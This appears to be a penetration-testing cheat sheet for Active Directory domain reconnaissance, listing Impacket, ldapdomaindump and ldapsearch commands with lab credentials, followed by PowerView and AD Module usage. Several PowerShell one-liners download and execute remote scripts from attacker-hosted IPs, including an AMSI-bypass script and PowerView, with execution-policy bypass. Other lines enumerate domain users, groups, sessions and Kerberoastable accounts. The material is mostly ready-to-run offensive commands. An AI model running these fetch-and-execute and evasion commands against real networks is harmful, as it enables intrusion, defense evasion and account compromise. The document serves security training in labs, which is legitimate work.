# Domain Recon

### Linux

#### All AD Users

{% code overflow="wrap" %}
```bash
# Impacket tool
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.51.164

GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople | awk '/Administrator/,/sql_svc/ {print $1}' > findings/users-north-all.txt   
```
{% endcode %}

#### LDAP (389)

{% code overflow="wrap" %}
```bash
# Dump ldap-based domain information
ldapdomaindump -u north.sevenkingdoms.local\\brandon.stark -p iseedeadpeople -d ';' 192.168.56.11  
ldapdomaindump -u north.sevenkingdoms.local\\brandon.stark -p iseedeadpeople -d ';' 192.168.56.10  

ldapdomaindump -u contoso\\kali -p Password0- -d ';' 10.10.10.1

# Kali with ldap query for domain information
ldapsearch -LLL -x -H ldap://10.10.10.1 -b '' -s base '(objectclass=*)
ldapsearch -h 10.10.10.1 -x -s base namingcontexts

ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'

ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'description:'

ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"

ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))"
```
{% endcode %}



### Windows

### PowerView

[https://github.com/PowerShellMafia/PowerSploit\
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploithttps:/github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

{% code overflow="wrap" %}
```powershell
# You may want to bypass AMSI first. 
PS> iex (new-Object Net.WebClient).DownloadString('http://10.10.10.100/privesc/my-am-bypass.ps1')

# Powerview 
CMD> powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')"
CMD> powershell.exe -exec Bypass -noexit -C "IEX (new-Object Net.WebClient).DownloadString('http://192.168.119.128/PowerView.ps1')"

PS> iex (new-Object Net.WebClient).DownloadString('http://10.10.10.100/privesc/PowerView.ps1')|Import-Module PowerView.ps1
```
{% endcode %}

### Active Directory Module

[Active Directory Module | Microsoft Docs](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)\
[https://github.com/samratashok/ADModule](https://github.com/samratashok/ADModule)

{% code overflow="wrap" %}
```powershell
# You may want to bypass AMSI first.
PS> iex (new-Object Net.WebClient).DownloadString('http://10.10.10.100/privesc/my-am-bypass.ps1')

CMD> powershell.exe -exec Bypass -noexit -C "iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory"

PS> iex (new-Object Net.WebClient).DownloadString('http://10.10.10.100/privesc/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```
{% endcode %}

### Basic Enumeration

{% code overflow="wrap" %}
```bash
# Local AD IP address
nslookup -type=all  _ldap._tcp.dc._msdcs.<Domain Name> 
nslookup -type=all  _ldap._tcp.dc._msdcs.THROWBACK.local

# Enumerate all users in the entire domain
net user /domain

# Get information from a specific user
net user <username> /domain

# Enumerate all groups in the entire domain
net group /domain

# Get members of local group
Get-NetLocalGroup -ComputerName <domain> -Recurse  # Powerview 

# Get quick current domain controller and the domain information
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Enumerate loggeded-in users
Get-NetLoggedon -ComputerName client251 # Powerview 

# Get all active sessions
Get-NetSession -ComputerName dc01
```
{% endcode %}

### Active Directory Enumeration (PowerView)&#x20;

{% code overflow="wrap" %}
```powershell
# Get Domain information
PS> Get-NetDomain    

# Get SID ID
PS> Get-DomainSID
PS> Get-DomainPolicy

# Get Domain Controller Information
PS> Get-NetDomainController

# Get Domain Users
PS> Get-NetUser

# Kerberoastable users !!!! 
PS> Get-NetUser -SPN

# Get Group Information
Get-NetGroup | select samaccountname, admincount, description

# Find share
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt
```
{% endcode %}
